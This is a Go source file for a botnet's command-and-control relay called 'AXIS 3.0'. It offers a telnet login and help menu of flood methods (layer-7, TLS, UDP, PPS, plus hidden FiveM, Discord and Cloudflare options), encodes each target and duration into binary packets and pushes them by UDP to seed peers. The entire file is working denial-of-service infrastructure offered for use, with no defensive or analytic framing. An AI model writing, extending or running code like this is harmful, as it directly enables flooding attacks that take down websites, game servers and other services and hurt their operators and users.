package main

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"time"
)

/*
 * AXIS 3.0 P2P Relay Server
 * Telnet interface for sending commands through P2P network
 */

type RelayUser struct {
	conn     net.Conn
	username string
	loggedIn bool
}

func main() {
	fmt.Printf("AXIS 3.0 P2P Relay Server\n")
	fmt.Printf("=========================\n\n")
	fmt.Printf("Listening on %s\n", RelayListenAddr)
	fmt.Printf("Seed peers: %v\n\n", seedPeers)

	listener, err := net.Listen("tcp", RelayListenAddr)
	if err != nil {
		fmt.Printf("Failed to start listener: %v\n", err)
		return
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Printf("Accept error: %v\n", err)
			continue
		}
		go handleUser(conn)
	}
}

func handleUser(conn net.Conn) {
	defer conn.Close()

	user := &RelayUser{conn: conn, loggedIn: false}

	conn.Write([]byte("\x1b[1;34m   ╔═╗═╗ ╦╦╔═╗\r\n"))
	conn.Write([]byte("\x1b[1;36m   ╠═╣╔╩╦╝║╚═╗\r\n"))
	conn.Write([]byte("\x1b[1;94m   ╩ ╩╩ ╚═╩╚═╝\r\n"))
	conn.Write([]byte("\x1b[1;34m  AXIS 3.0 P2P Relay\r\n"))
	conn.Write([]byte("\x1b[1;36m  Enter credentials\r\n"))
	conn.Write([]byte("\x1b[1;94mUsername\x1b[1;36m: \x1b[0m"))

	scanner := bufio.NewScanner(conn)

	if !scanner.Scan() {
		return
	}
	user.username = strings.TrimSpace(scanner.Text())

	conn.Write([]byte("Password: "))
	if !scanner.Scan() {
		return
	}
	password := strings.TrimSpace(scanner.Text())

	if validUsers[user.username] != password {
		conn.Write([]byte("\r\n\x1b[1;31mInvalid credentials\r\n"))
		time.Sleep(1 * time.Second)
		return
	}

	user.loggedIn = true
	conn.Write([]byte("\r\n\x1b[1;32mLogin successful!\r\n\r\n"))

	showHelp(user)

	for {
		conn.Write([]byte("\x1b[1;36maxis-p2p>\x1b[0m "))
		if !scanner.Scan() {
			break
		}

		cmd := strings.TrimSpace(scanner.Text())
		if cmd == "" {
			continue
		}

		if cmd == "quit" || cmd == "exit" {
			conn.Write([]byte("Goodbye\r\n"))
			break
		}

		if cmd == "help" || cmd == "?" {
			showHelp(user)
			continue
		}

		if cmd == "peers" {
			conn.Write([]byte(fmt.Sprintf("Seed peers: %v\r\n", seedPeers)))
			continue
		}

		if cmd == "status" {
			conn.Write([]byte(fmt.Sprintf("User: %s\r\n", user.username)))
			conn.Write([]byte(fmt.Sprintf("Seed peers: %d\r\n", len(seedPeers))))
			conn.Write([]byte("Status: Connected\r\n"))
			continue
		}

		parts := strings.Fields(cmd)
		if len(parts) < 3 {
			conn.Write([]byte("\x1b[1;31mInvalid command format\r\n"))
			conn.Write([]byte("Usage: <method> <target> <duration>\r\n"))
			continue
		}

		method := parts[0]
		target := parts[1]
		duration := parts[2]

		err := sendP2PCommand(method, target, duration)
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("\x1b[1;31mError: %v\r\n", err)))
		} else {
			conn.Write([]byte(fmt.Sprintf("\x1b[1;32mCommand sent! %s on %s for %ss\r\n", method, target, duration)))
		}
	}
}

func showHelp(user *RelayUser) {
	conn := user.conn
	conn.Write([]byte("\r\n"))
	conn.Write([]byte("\x1b[1;34m╔══════════════════════════════════════════╗\r\n"))
	conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAXIS 3.0 P2P Relay Commands\x1b[1;34m            ║\r\n"))
	conn.Write([]byte("\x1b[1;34m╠══════════════════════════════════════════╣\r\n"))
	conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAttack Commands:\x1b[1;34m                         ║\r\n"))
	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-l7 <target> <duration>\x1b[1;34m            ║\r\n"))
	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtlsplus <target> <duration>\x1b[1;34m            ║\r\n"))
	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtls <target> <duration>\x1b[1;34m                ║\r\n"))
	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mudp <target> <duration>\x1b[1;34m                ║\r\n"))
	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mpps <target> <duration>\x1b[1;34m                ║\r\n"))
	conn.Write([]byte("\x1b[1;34m╠══════════════════════════════════════════╣\r\n"))
	conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mOther Commands:\x1b[1;34m                          ║\r\n"))
	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mhelp\x1b[1;34m, \x1b[1;93m?\x1b[1;34m        - Show this help\x1b[1;34m          ║\r\n"))
	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mstatus\x1b[1;34m        - Show connection status\x1b[1;34m    ║\r\n"))
	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mpeers\x1b[1;34m         - Show seed peers\x1b[1;34m           ║\r\n"))
	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mquit\x1b[1;34m, \x1b[1;93mexit\x1b[1;34m     - Disconnect\x1b[1;34m              ║\r\n"))
	conn.Write([]byte("\x1b[1;34m╠══════════════════════════════════════════╣\r\n"))
	conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mExamples:\x1b[1;34m                              ║\r\n"))
	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-l7 1.2.3.4 300\x1b[1;34m                    ║\r\n"))
	conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtlsplus example.com 600\x1b[1;34m                ║\r\n"))
	conn.Write([]byte("\x1b[1;34m╚══════════════════════════════════════════╝\x1b[0m\r\n"))
	conn.Write([]byte("\r\n"))
}

func sendP2PCommand(method, target, duration string) error {
	attackID := getAttackID(method)
	if attackID == 255 {
		return fmt.Errorf("unknown method: %s", method)
	}

	var durationInt uint32
	fmt.Sscanf(duration, "%d", &durationInt)

	packet := make([]byte, 14)
	packet[0] = 0x10
	packet[1] = 0
	packet[2] = attackID
	packet[3] = 1

	ip := net.ParseIP(target)
	if ip == nil {
		ip = net.ParseIP("1.1.1.1")
	}
	ip4 := ip.To4()
	if ip4 == nil {
		ip4 = net.ParseIP("1.1.1.1").To4()
	}
	copy(packet[4:8], ip4)
	packet[8] = 32
	packet[9] = 0

	binary.LittleEndian.PutUint32(packet[10:14], durationInt)

	for _, seed := range seedPeers {
		addr, err := net.ResolveUDPAddr("udp", seed)
		if err != nil {
			continue
		}

		conn, err := net.DialUDP("udp", nil, addr)
		if err != nil {
			continue
		}

		conn.Write(packet)
		conn.Close()
	}

	return nil
}

func getAttackID(method string) uint8 {
	method = strings.ToLower(method)
	switch method {
	case "axis-l7", "l7":
		return 7
	case "tlsplus", "tls+":
		return 5
	case "tls":
		return 4
	case "cf":
		return 6
	case "udp":
		return 0
	case "vse":
		return 1
	case "fivem":
		return 2
	case "discord":
		return 30
	case "pps":
		return 3
	default:
		return 255
	}
}
